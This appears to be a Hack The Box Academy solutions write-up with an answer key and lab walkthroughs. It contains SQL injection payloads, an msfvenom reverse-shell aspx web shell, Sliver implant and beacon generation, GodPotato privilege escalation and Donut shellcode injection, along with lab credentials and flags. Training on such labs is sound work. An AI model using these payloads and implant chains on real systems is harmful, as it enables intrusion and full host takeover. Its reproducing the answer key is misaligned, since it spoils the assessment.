| Section | Question Number | Answer |
| --- | --- | --- |
| Probing the Surface | Question 1 | sa |
| Probing the Surface | Question 2 | IIS APPPOOL\\DefaultAppPool |
| Probing the Surface | Question 3 | HTB{5d0136916885bfe67f431f59879fc2bd} |
| Privilege Escalation | Question 1 | HTB{e55ac6b4c58ccdaead020253507ac442} |
| Assumed breach | Question 1 | a87f3a337d73085c45f9416be5787d86 |
| Domain Reconnaissance | Question 1 | 1118 |
| Domain Reconnaissance | Question 2 | 7 |
| Domain Reconnaissance | Question 3 | 42 |
| Domain Reconnaissance | Question 4 | htb.local |
| Domain Reconnaissance | Question 5 | frank |
| Domain Reconnaissance | Question 6 | 172.16.1.11 |
| Pivoting | Question 1 | Yes |
| Kerberos Exploitaton | Question 1 | beautiful1 |
| Kerberos Exploitaton | Question 2 | 1q2w3e4r |
| Lateral Movement | Question 1 | High |
| Kerberos Delegations | Question 1 | e7d6a507876e2c8b7534143c1c6f28ba |
| Kerberos Delegations | Question 2 | 4 |
| DACL Exploitation | Question 1 | GenericWrite |
| DACL Exploitation | Question 2 | spongebob |
| Domain Controller Compromise | Question 1 | 641128aec722d13eefd5c51709330810 |
| Skills Assessment | Question 1 | HTB{jus7\_g3tt1ng\_$tart3d} |
| Skills Assessment | Question 2 | HTB{c4r3ful\_w1th\_7h3\_pr1vs$} |
| Skills Assessment | Question 3 | HTB{g3tting\_U$ed\_To\_17} |
| Skills Assessment | Question 4 | HTB{1\_4m\_7h3\_4dm1n\_oF\_3v3ryth1nG} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Probing the Surface

## Question 1

### "Assess further the web application and submit the name of the database user"

Students need to begin by opening `Firefox` and browsing to `http://STMIP/`, where they will recognize the same web application shown in the section's reading. Besides the obvious `upload` functionality, the application offers the user the ability to search for courses based on `Course Name`, `Author`, and `Price`:

![[HTB Solutions/CAPE/z. images/26da4b5317388c74f4d867095eb33591_MD5.jpg]]

Subsequently, students need to test for SQL Injection vulnerabilities, beginning with `Error-Based SQLi`. Therefore, students need to insert a single apostrophe `'` into the `Course Name` field and press Search:

![[HTB Solutions/CAPE/z. images/b99a63fbb92057c99fc9c653dcf9c319_MD5.jpg]]

Confirming the presence of `Error-Based SQLi`, students need to further enumerate the database. By using `ORDER BY` , students need to sequentially test the numbers 1, 2, 3, and 4:

Code: sql

```sql
' ORDER BY 1; -- -
' ORDER BY 2; -- -
' ORDER BY 3; -- -
```

![[HTB Solutions/CAPE/z. images/c6e3f533d0622be648059973e42f0dfa_MD5.jpg]]

However, upon testing `ORDER BY 4`, students will see the server return an error:

![[HTB Solutions/CAPE/z. images/90dbc044a366b30c44fd390a444d2f60_MD5.jpg]]

With the number of columns now identified at `3`, students need to use `Union Injection` to enumerate the database version:

Code: sql

```sql
' UNION SELECT @@VERSION,null,null;-- -
```

![[HTB Solutions/CAPE/z. images/29779cf7896c8c5d9b3480204997b755_MD5.jpg]]

With the database now fingerprinted as `Microsoft SQL Server 2019`, students need to use the [SYSTEM\_USER](https://www.w3schools.com/sql/func_sqlserver_system_user.asp) function to identify the name of the user currently logged into the database:

Code: sql

```sql
' UNION SELECT SYSTEM_USER,null,null;-- -
```

Students will find `{hidden}` is the name of the database user.

Answer: `sa`

# Probing the Surface

## Question 2

### "What is the name of the user from the session captured in Sliver"

Students need to begin by downloading both the `Sliver Server` and `Sliver Client` binaries, with `execute` permission enabled on both; students can achieve this using the following bash script:

Code: bash

```bash
#!/bin/bash

mkdir sliver
cd sliver/
wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux
chmod +x ./sliver-server_linux
wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux
chmod +x ./sliver-client_linux
```

Next, students need to start the server , create a new `operator profile`, then enable `multiplayer` mode:

Code: shell

```shell
cd sliver/
./sliver-server_linux
new-operator -n student -l PWNIP
multiplayer
```

```
┌─[eu-academy-2]─[10.10.14.244]─[htb-ac-594497@htb-oj1gqefoyw]─[~]
└──╼ [★]$ cd sliver/
┌─[eu-academy-2]─[10.10.14.244]─[htb-ac-594497@htb-oj1gqefoyw]─[~/sliver]
└──╼ [★]$ ./sliver-server_linux 

<SNIP>

All hackers gain jump-start
[*] Server v1.5.42 - 85b0e870d05ec47184958dbcb871ddee2eb9e3df
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

[server] sliver > new-operator -n student -l 10.10.14.244

[*] Generating new client certificate, please wait ... 
[*] Saved new client config to: /home/htb-ac-594497/sliver/student_10.10.14.244.cfg 

[server] sliver > multiplayer

[*] Multiplayer mode enabled!
```

Students now need to open a new terminal tab, navigate into the `~/sliver` directory then subsequently import their the operator profile:

Code: shell

```shell
cd ~/sliver/
./sliver-client_linux import student_STMIP.cfg 
```

```
┌─[eu-academy-2]─[10.10.14.244]─[htb-ac-594497@htb-oj1gqefoyw]─[~]
└──╼ [★]$ cd ~/sliver/

┌─[eu-academy-2]─[10.10.14.244]─[htb-ac-594497@htb-oj1gqefoyw]─[~/sliver]
└──╼ [★]$ ./sliver-client_linux import student_10.10.14.244.cfg 

2024/06/04 22:02:36 Saved new client config to: /home/htb-ac-594497/.sliver-client/configs/student_10.10.14.244.cfg
```

After successfully importing the profile, students need to start the client component of Sliver:

Code: shell

```shell
./sliver-client_linux
```

```
┌─[eu-academy-2]─[10.10.14.244]─[htb-ac-594497@htb-oj1gqefoyw]─[~/sliver-]
└──╼ [★]$ ./sliver-client_linux 

Connecting to 10.10.14.244:31337 ...

 	  ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
	▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
	░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
	  ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
	▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
	▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
	░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
	░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
		  ░      ░  ░ ░        ░     ░  ░   ░

All hackers gain jump-start
[*] Server v1.5.42 - 85b0e870d05ec47184958dbcb871ddee2eb9e3df
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

sliver >  
```

To prepare for the engagement, students should first install all of the `armory` extensions:

Code: shell

```shell
armory install all
```

```
sliver > armory install all

? Install 21 aliases and 128 extensions? Yes
[*] Installing alias 'Sharp Hound 3' (v0.0.2) ... done!
[*] Installing alias 'SharpUp' (v0.0.1) ... done!
<SNIP>
[*] Installing extension 'c2tc-spray-ad' (v0.0.9) ... done!
[*] Installing extension 'find-module' (v0.0.2) ... done!
[*] Installing extension 'remote-reg-delete' (v0.0.7) ... done!
[*] Installing extension 'sa-cacls' (v0.0.21) ... done!

[*] All packages installed
```

Along with creating a new HTTP implant profile , students need to create a stage listener (from which the victim web server will connect to, and have the implant delivered). Students will also need to create an HTTP listener (as the implant will be performing http callbacks, on port 8088 as specified in the profile) and generate the stager (raw shellcode instructing the victim to connect to the stage listener, delivering the implant):

Code: shell

```shell
profiles new --http STMIP:8088 --format shellcode htb
stage-listener --url tcp://PWNIP:4443 --profile htb
http -L PWNIP -l 8088
generate stager --lhost PWNIP --lport 4443 --format csharp --save staged.txt
```

```
sliver > profiles new --http 10.10.14.244:8088 --format shellcode htb

[*] Saved new implant profile htb

sliver > stage-listener --url tcp://10.10.14.244:4443 --profile htb

[*] No builds found for profile htb, generating a new one
[*] Sliver name for profile htb: ARTIFICIAL_TIMEOUT
[*] Job 2 (tcp) started

sliver > http -L 10.10.14.244 -l 8088

[*] Starting HTTP :8088 listener ...
[*] Successfully started job #3

sliver > generate stager --lhost 10.10.14.244 --lport 4443 --format csharp --save staged.txt

[*] Sliver implant stager saved to: /home/htb-ac-594497/sliver/staged.txt
```

Due to the target webserver's use of `aspx` (a Windows-based framework allowing dynamic web pages using the `Net` and `C#` programming languages), students need to use `msfvenom` to generate an `aspx` payload:

Code: shell

```shell
msfvenom -p windows/shell/reverse_tcp LHOST=PWNIP LPORT=4443 -f aspx > sliver.aspx
```

Code: session

```
┌─[eu-academy-2]─[10.10.14.244]─[htb-ac-594497@htb-oj1gqefoyw]─[~/sliver]
└──╼ [★]$ msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.244 LPORT=4443 -f aspx > sliver.aspx

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2911 bytes
```

The resulting `sliver.aspx` must now be modified; specifically, students need to replace the byte array used by the `Page_Load` function in `sliver.aspx` with the bytes seen in the `staged.txt` file:

![[HTB Solutions/CAPE/z. images/83ba0e44ef1547bb3ceef865bd1e3aba_MD5.jpg]]

![[HTB Solutions/CAPE/z. images/ecc14c96204da9fc9bb2f884cb06450f_MD5.jpg]]

![[HTB Solutions/CAPE/z. images/0e7f5f46f8222ff31195909e10df50c1_MD5.jpg]]

Students need to save the changes, return to `Firefox` and use the target web application's `Upload` feature to upload `sliver.aspx`. Dummy information can be used to fill out the Course Name, Author, and Price:

![[HTB Solutions/CAPE/z. images/1d8309b76b4adfc05e5ef157183a33f7_MD5.jpg]]

Once uploaded, students need to visit `http://STMIP/uploads/sliver.aspx`:

![[HTB Solutions/CAPE/z. images/f6318d7724b0c24174bfa2e564acda7e_MD5.jpg]]

After a few moments, students need to return to their `Sliver` terminal, where an active session has now appeared:

```
[*] Session 6a0a2d87 FASHIONABLE_EXHAUST - 10.129.205.234:49693 (web01) - windows/amd64 - Tue, 04 Jun 2024 23:34:40 BST

sliver >  
```

Students need to now list the active sessions. Then, using the `use` command followed by the first few characters of the `ID`, activating the chosen session:

Code: shell

```shell
sessions
use [Session ID]    // tab autocomplete can be used here
```

```
sliver > sessions

 ID         Name                 Transport   Remote Address         Hostname   Username   Operating System   Locale   Last Message                            Health  
========== ==================== =========== ====================== ========== ========== ================== ======== ======================================= =========
 6a0a2d87  FASHIONABLE_EXHAUST   http(s)     10.129.205.234:49693   web01      <err>      windows/amd64      en-US    Tue Jun  4 23:40:19 BST 2024 (1s ago)   [ALIVE] 

sliver > use 6a0a2d87-bea3-421c-85cb-6173992ba318

[*] Active session FASHIONABLE_EXHAUST (6a0a2d87-bea3-421c-85cb-6173992ba318)

sliver (FASHIONABLE_EXHAUST) >  
```

With remote code execution now possible, students need to use the `info` command to learn some key information about the compromised machine, followed by `whoami` to determine which user context the session is running under:

Code: shell

```shell
info
whoami
```

```
sliver (FASHIONABLE_EXHAUST) > info

        Session ID: 6a0a2d87-bea3-421c-85cb-6173992ba318
              Name: ARTIFICIAL_TIMEOUT
          Hostname: web01
              UUID: 53a91442-4dee-faf4-6aae-22993396379c
          Username: <err>
               UID: <err>
               GID: <err>
               PID: 4820
                OS: windows
           Version: Server 2016 build 17763 x86_64
            Locale: en-US
              Arch: amd64
         Active C2: https://10.10.14.244:8088
    Remote Address: 10.129.205.234:49693
         Proxy URL: 
Reconnect Interval: 1m0s
     First Contact: Tue Jun  4 23:34:40 BST 2024 (7m2s ago)
      Last Checkin: Tue Jun  4 23:41:41 BST 2024 (1s ago)

sliver (FASHIONABLE_EXHAUST) > whoami

Logon ID: <err>
[*] Current Token ID: {hidden}
```

Students will see the current Token ID is set to `{hidden}`.

Answer: `IIS APPPOOL\DefaultAppPool`

# Probing the Surface

## Question 3

### "Submit the contents of the text file located at C:\\Users\\Public"

Using the previously obtained session, students need to list the contents of the above-mentioned directory and then `cat` the `user.txt` file:

Code: shell

```shell
ls /users/public
cat /users/public/user.txt
```

```
sliver (FASHIONABLE_EXHAUST) > ls /users/public

c:\users\public (10 items, 211 B)
=================================
dr-xr-xr-x  AccountPictures  <dir>  Wed Jan 18 15:59:28 -0700 2023
dr-xr-xr-x  Desktop          <dir>  Sat Sep 15 00:19:03 -0700 2018
-rw-rw-rw-  desktop.ini      174 B  Sat Sep 15 00:16:48 -0700 2018
dr-xr-xr-x  Documents        <dir>  Mon Sep 12 17:12:55 -0700 2022
dr-xr-xr-x  Downloads        <dir>  Sat Sep 15 00:19:03 -0700 2018
dr-xr-xr-x  Libraries        <dir>  Sat Sep 15 00:19:03 -0700 2018
dr-xr-xr-x  Music            <dir>  Sat Sep 15 00:19:03 -0700 2018
dr-xr-xr-x  Pictures         <dir>  Sat Sep 15 00:19:03 -0700 2018
-rw-rw-rw-  user.txt         37 B   Wed Jul 19 08:39:50 -0700 2023
dr-xr-xr-x  Videos           <dir>  Sat Sep 15 00:19:03 -0700 2018

sliver (FASHIONABLE_EXHAUST) > cat /users/public/user.txt

{hidden}
```

Answer: `HTB{5d0136916885bfe67f431f59879fc2bd}`

# Privilege Escalation

## Question 1

### "Escalate your privileges and submit the contents of the web01\_root.txt flag located on the Administrator's Desktop"

Students need to further enumerate the compromised machine, utilizing [SharpUp](https://github.com/GhostPack/SharpUp) from the Armory to learn about privileges, registries, and unquoted service paths:

Code: shell

```shell
sharpup -- audit
```

```
sliver (FASHIONABLE_EXHAUST) > sharpup -- audit

[*] sharpup output:

=== SharpUp: Running Privilege Escalation Checks ===
[!] Modifialbe scheduled tasks were not evaluated due to permissions.

=== Abusable Token Privileges ===
	SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED

=== Modifiable Services ===
	[X] Exception: Exception has been thrown by the target of an invocation.
	[X] Exception: Exception has been thrown by the target of an invocation.
	[X] Exception: Exception has been thrown by the target of an invocation.
	Service 'UsoSvc' (State: Running, StartMode: Auto)

[*] Completed Privesc Checks in 25 seconds
```

Based on the output, the current user has the [SeImpersonatePrivilege](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) privilege, making for a strong candidate for a [Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) induced privilege escalation.

Therefore, students need to download [GodPotato](https://github.com/BeichenDream/GodPotato) to their host machine:

Code: shell

```shell
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
```

```
┌─[eu-academy-2]─[10.10.15.192]─[htb-ac-594497@htb-dxjnbeyirx]─[~/sliver]
└──╼ [★]$ wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe

--2024-06-05 15:53:23--  https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
Resolving github.com (github.com)... 140.82.113.4
Connecting to github.com (github.com)|140.82.113.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
<SNIP>
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 57344 (56K) [application/octet-stream]
Saving to: ‘GodPotato-NET4.exe’

GodPotato-NET4.exe                              100%[====================================================================================================>]  56.00K  --.-KB/s    in 0.001s  

2024-06-05 15:53:24 (55.6 MB/s) - ‘GodPotato-NET4.exe’ saved [57344/57344]
```

And subsequently, students need to return to their Sliver session, using `execute-assembly` along with `GodPotato-NET4.exe` to see the results of the `whoami` command:

Code: shell

```shell
execute-assembly --timeout 120 /home/<USER>/sliver/GodPotato-NET4.exe -cmd "whoami"
```

```
sliver (FASHIONABLE_EXHAUST) > execute-assembly --timeout 120 /home/htb-ac-594497/sliver/GodPotato-NET4.exe -cmd "whoami"

[*] Output:
[*] CombaseModule: 0x140705781317632
[*] DispatchTable: 0x140705783626976
[*] UseProtseqFunction: 0x140705783006304
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\139eeb8d-6cd4-4f54-a7ec-51081ec369b2\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00004002-01a0-ffff-8e5e-3af3afa5c51d
[*] DCOM obj OXID: 0xf0a601aa14e16a51
[*] DCOM obj OID: 0xfae40c3583db3910
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 956 Token:0x664  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 4008

nt authority\system
```

Confirming the ability to use `GodPotato-Net4.exe` to achieve `SYSTEM` level command execution, there are several methods students can use to obtain the flag. However, with the goal of maintaining maximum `Operational Security`, students need to consider using `Donut`. This will be used to generate the position-independent shellcode equivalent of `GodPotato`, which will then be delivered to the target host.

Therefore, students need to download the `donut` repository, and use `make` to generate a useable binary:

Code: shell

```shell
git clone https://github.com/TheWover/donut
cd donut/
make -f Makefile
chmod 777 ./donut
```

```
┌─[eu-academy-2]─[10.10.15.192]─[htb-ac-594497@htb-dxjnbeyirx]─[~/sliver]
└──╼ [★]$ git clone https://github.com/TheWover/donut

Cloning into 'donut'...
remote: Enumerating objects: 4033, done.
remote: Counting objects: 100% (324/324), done.
remote: Compressing objects: 100% (130/130), done.
remote: Total 4033 (delta 210), reused 287 (delta 192), pack-reused 3709
Receiving objects: 100% (4033/4033), 9.85 MiB | 20.84 MiB/s, done.
Resolving deltas: 100% (2796/2796), done.

┌─[eu-academy-2]─[10.10.15.192]─[htb-ac-594497@htb-dxjnbeyirx]─[~/sliver]
└──╼ [★]$ cd donut/

┌─[eu-academy-2]─[10.10.15.192]─[htb-ac-594497@htb-dxjnbeyirx]─[~/sliver/donut]
└──╼ [★]$ make -f Makefile

rm -f loader.exe exe2h.exe exe2h loader32.exe loader64.exe donut.o hash.o encrypt.o format.o clib.o hash encrypt donut hash.exe encrypt.exe donut.exe lib/libdonut.a lib/libdonut.so
gcc -Wunused-function -Wall -fpack-struct=8 -DDONUT_EXE -I include donut.c hash.c encrypt.c format.c loader/clib.c lib/aplib64.a -odonut 
gcc -Wunused-function -Wall -c -fpack-struct=8 -fPIC -I include donut.c hash.c encrypt.c format.c loader/clib.c 
ar rcs lib/libdonut.a donut.o hash.o encrypt.o format.o clib.o lib/aplib64.a
gcc -Wall -shared -o lib/libdonut.so donut.o hash.o encrypt.o format.o clib.o lib/aplib64.a

┌─[eu-academy-2]─[10.10.15.192]─[htb-ac-594497@htb-dxjnbeyirx]─[~/sliver/donut]
└──╼ [★]$ chmod 777 ./donut
```

Taking it a step further, students can achieve `persistence` by generating a new `http beacon`, then having the aforementioned beacon executed by `GodPotato`; more specifically by the `Donut` generated shellcode. Subsequently, students need to return to their Sliver terminal, and create a new `http beacon` and `http listener`:

Code: shell

```shell
generate beacon --http PWNIP:PWNPO --skip-symbols -N http-beacon
http -l PWNPO
```

```
sliver (FASHIONABLE_EXHAUST) > generate beacon --http 10.10.15.192:9002 --skip-symbols -N http-beacon

[*] Generating new windows/amd64 beacon implant binary (1m0s)
[!] Symbol obfuscation is disabled
[*] Build completed in 4s
[*] Implant saved to /home/htb-ac-594497/sliver/http-beacon.exe

sliver (FASHIONABLE_EXHAUST) > http -l 9002

[*] Starting HTTP :9002 listener ...
[*] Successfully started job #4
```

Furthermore, students need to create a new directory on the target host, `C:\temp`, where the http beacon is to be uploaded:

Code: shell

```shell
cd C:/
mkdir C:/temp
cd C:/temp
upload --timeout 180 /home/<user>/sliver/http-beacon.exe C:/temp/http-beacon.exe
ls
```

```
sliver (FASHIONABLE_EXHAUST) > cd C:/

[*] C:\

sliver (FASHIONABLE_EXHAUST) > mkdir C:/temp

[*] c:\temp

sliver (FASHIONABLE_EXHAUST) > cd C:/temp

[*] c:\temp

sliver (FASHIONABLE_EXHAUST) > upload --timeout 180 /home/htb-ac-594497/sliver/http-beacon.exe C:/temp/http-beacon.exe

[*] Wrote file to C:\temp\http-beacon.exe

sliver (FASHIONABLE_EXHAUST) > ls

C:\temp (1 item, 10.5 MiB)
==========================
-rw-rw-rw-  http-beacon.exe  10.5 MiB  Wed Jun 05 16:51:22 -0700 2024

c:\temp (1 item, 10.5 MiB)
```

Students need to return to the terminal on their host machine, and use `donut` to generate the shellcode equivalent of `Godpotato` executing the beacon. In the example below, the final shellcode is saved under the file name `godpotato.bin`:

Code: shell

```shell
cd ~/sliver/donut/
/donut -i ../GodPotato-NET4.exe -a 2 -b 2 -p '-cmd c:\temp\http-beacon.exe' -o /home/htb-ac-594497/sliver/godpotato.bin
```

```
┌─[eu-academy-2]─[10.10.15.192]─[htb-ac-594497@htb-dxjnbeyirx]─[~/sliver]
└──╼ [★]$ cd ~/sliver/donut/

┌─[eu-academy-2]─[10.10.15.192]─[htb-ac-594497@htb-dxjnbeyirx]─[~/sliver/donut]
└──╼ [★]$ ./donut -i ../GodPotato-NET4.exe -a 2 -b 2 -p '-cmd c:\temp\http-beacon.exe' -o /home/htb-ac-594497/sliver/godpotato.bin

  [ Donut shellcode generator v1 (built Jun  5 2024 17:24:59)
  [ Copyright (c) 2019-2021 TheWover, Odzhan

  [ Instance type : Embedded
  [ Module file   : "../GodPotato-NET4.exe"
  [ Entropy       : Random names + Encryption
  [ File type     : .NET EXE
  [ Parameters    : cmd c:\temp\http-beacon.exe
  [ Target CPU    : amd64
  [ AMSI/WDLP/ETW : abort
  [ PE Headers    : overwrite
  [ Shellcode     : "/home/htb-ac-594497/sliver/godpotato.bin"
  [ Exit          : Thread
```

Now, for maximum `OpSec`, students need to use `Rubeus.exe` from the `SharpCollection` to spawn a sacrificial process on the target host; the subsequent process will have the `godpotato.bin` shellcode injected into sacrificial process' memory space, thus executing the beacon with `SYSTEM` privileges. First, students need to copy `Rubeus.exe` into `~/sliver/`:

Code: shell

```shell
cd ~/sliver/
cp SharpCollection/NetFramework_4.0_Any/Rubeus.exe .
```

```
┌─[eu-academy-2]─[10.10.15.192]─[htb-ac-594497@htb-dxjnbeyirx]─[~/sliver/donut]
└──╼ [★]$ cd ~/sliver/

┌─[eu-academy-2]─[10.10.15.192]─[htb-ac-594497@htb-dxjnbeyirx]─[~/sliver]
└──╼ [★]$ cp SharpCollection/NetFramework_4.0_Any/Rubeus.exe .
```

Returning to the sliver session and using `execute-assembly` to have have `Rubeus.exe` spawn the sacrificial process (`notepad.exe` in this example), students will subsequently use `execute-shellcode` to trigger the beacon via `godpotato.bin`:

Code: shell

```shell
execute-assembly --timeout 180 Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe
execute-shellcode -p <PID of notepad.exe> /home/<USER>/sliver/godpotato.bin
```

```
sliver (FASHIONABLE_EXHAUST) > execute-assembly --timeout 180 Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe

[*] Output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 

[*] Action: Create Process (/netonly)

[*] Using random username and password.

[*] Showing process : False
[*] Username        : 9RBJF2YF
[*] Domain          : 0JQ4GQM8
[*] Password        : EN8FZJAS
[+] Process         : 'C:\windows\system32\notepad.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 5444
[+] LUID            : 0x2f6c29

sliver (FASHIONABLE_EXHAUST) > execute-shellcode -p 5444 /home/htb-ac-594497/sliver/godpotato.bin

[*] Executed shellcode on target

sliver (FASHIONABLE_EXHAUST) > jobs

[*] Beacon ee51bfdf http-beacon - 10.129.205.234:49829 (web01) - windows/amd64 - Wed, 05 Jun 2024 23:49:31 BST                                        
```

Students need to utilize the `beacons` command to find the ID of the beacon which just established a callback, confirming the username `NT AUTHORITY\SYSTEM`. Subsequently, students need to `use` the beacon to make it active:

Code: shell

```shell
beacons
use [ID of Beacon]     // Tab autocomplete can be used here
```

```
sliver (FASHIONABLE_EXHAUST) > beacons

 ID         Name          Tasks   Transport   Remote Address         Hostname   Username              Operating System   Locale   Last Check-In                            Next Check-In                           
========== ============= ======= =========== ====================== ========== ===================== ================== ======== ======================================== =========================================
 ee51bfdf   http-beacon   0/0     http(s)     10.129.205.234:49829   web01      NT AUTHORITY\SYSTEM   windows/amd64      en-US    Wed Jun  5 23:49:32 BST 2024 (14s ago)   Wed Jun  5 23:51:01 BST 2024 (in 1m15s) 

sliver (FASHIONABLE_EXHAUST) > use ee51bfdf-2866-45b0-80ee-92b9c5c95f79

[*] Active beacon http-beacon (ee51bfdf-2866-45b0-80ee-92b9c5c95f79)

sliver (http-beacon) >
```

With the beacon now active, students need to queue the task to read the contents of `C:\Users\Administrator\Desktop\web01_root.txt`:

Code: shell

```shell
 cat /Users/Administrator/Desktop/web01_root.txt
```

```
sliver (http-beacon) > cat /Users/Administrator/Desktop/web01_root.txt

[*] Tasked beacon http-beacon (1a0aafbe)

[+] http-beacon completed task 1a0aafbe

{hidden}
```

Answer: `HTB{e55ac6b4c58ccdaead020253507ac442}`

# Assumed breach

## Question 1

### "Dump the local SAM database and submit the NT hash of the admin account"

Students need to begin by creating a new `http beacon` along with an `http listener`:

Code: shell

```shell
generate beacon --http PWNIP:PWNPO --skip-symbols --os windows -N windows-http-beacon-9001
http -L PWNIP -l PWNPO
```

```
sliver > generate beacon --http 10.10.15.192:9001 --skip-symbols --os windows -N windows-http-beacon-9001

[*] Generating new windows/amd64 beacon implant binary (1m0s)
[!] Symbol obfuscation is disabled
[*] Build completed in 3s
[*] Implant saved to /home/htb-ac-594497/sliver/windows-http-beacon-9001.exe

sliver > http -L 10.10.15.192 -l 9001

[*] Starting HTTP :9001 listener ...
[*] Successfully started job #5
```

Subsequently, students need to connect to the spawned target with RDP, using the credentials `eric:letmein123` while providing a shared drive (in the example below, the `~/sliver` directory was chosen):

Code: shell

```shell
xfreerdp /v:STMIP /u:eric /p:Letmein123 /d:child.htb.local /dynamic-resolution /cert-ignore /drive:academy,/home/<user>/sliver
```

```
┌─[eu-academy-2]─[10.10.15.192]─[htb-ac-594497@htb-4wqiihcxy3]─[~]
└──╼ [★]$ xfreerdp /v:10.129.205.234 /u:eric /p:Letmein123 /d:child.htb.local /dynamic-resolution /cert-ignore /drive:academy,/home/htb-ac-594497/sliver

[00:52:43:036] [95655:95656] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[00:52:43:036] [95655:95656] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[00:52:43:136] [95655:95656] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[00:52:43:136] [95655:95666] [INFO][com.freerdp.channels.rdpdr.client] - Loading device service drive [academy] (static)
[00:52:43:136] [95655:95656] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
<SNIP>
```

Once connected, students need to open `File Explorer` and select `Network`\--> `TSClient` --> `Academy`. Then, students need look for the `http beacon` executable file. Once the beacon is found, students need to right click and `Run as Administrator`:

![[HTB Solutions/CAPE/z. images/32bcdf967dc19d57b2fdf45f79379bd0_MD5.jpg]]

Selecting `Run` when the security prompt appears, students need to return to their Sliver terminal, where the beacon callback will occur in a few moments. To set the beacon as Active, students need use the `use` command followed by the `ID` of the beacon. Additionally, students may exit out of the current RDP session, which is no longer needed:

Code: shell

```shell
beacons    // see list of beacons and associated ID
use [ID of newest beacon] 
```

```
[*] Beacon 379f7282 windows-http-beacon-9001 - 10.129.205.234:50017 (web01) - windows/amd64 - Thu, 06 Jun 2024 01:11:46 BST

sliver > beacons

 ID         Name                       Tasks   Transport   Remote Address         Hostname   Username              Operating System   Locale   Last Check-In                            Next Check-In                         
========== ========================== ======= =========== ====================== ========== ===================== ================== ======== ======================================== =======================================
 ee51bfdf   http-beacon                1/1     http(s)     10.129.205.234:49868   web01      NT AUTHORITY\SYSTEM   windows/amd64      en-US    Thu Jun  6 01:14:10 BST 2024 (51s ago)   Thu Jun  6 01:15:23 BST 2024 (in 22s) 
 379f7282   windows-http-beacon-9001   0/0     http(s)     10.129.205.234:50017   web01      CHILD\eric            windows/amd64      en-US    Thu Jun  6 01:14:05 BST 2024 (56s ago)   Thu Jun  6 01:15:24 BST 2024 (in 23s) 

sliver > use 379f7282-4c8a-4d8f-a729-5ad83c7fb0c5

[*] Active beacon windows-http-beacon-9001 (379f7282-4c8a-4d8f-a729-5ad83c7fb0c5)

[*] Beacon 37b55585 windows-http-beacon-9001 - 10.129.205.234:50040 (web01) - windows/amd64 - Thu, 06 Jun 2024 01:19:02 BST

sliver (windows-http-beacon-9001) >  
```

Students need to convert the beacon into a session, then `use` the new session ID to set it as active. Afterwards, students need to utilize the `getsystem` command; spawning a new beacon with `SYSTEM` level privileges:

Code: shell

```shell
interactive
use <Session ID> 
getsystem
```

```
sliver (windows-http-beacon-9001) > interactive

[*] Using beacon's active C2 endpoint: https://10.10.14.5:9001
[*] Tasked beacon windows-http-beacon-9001 (efb91a5c)

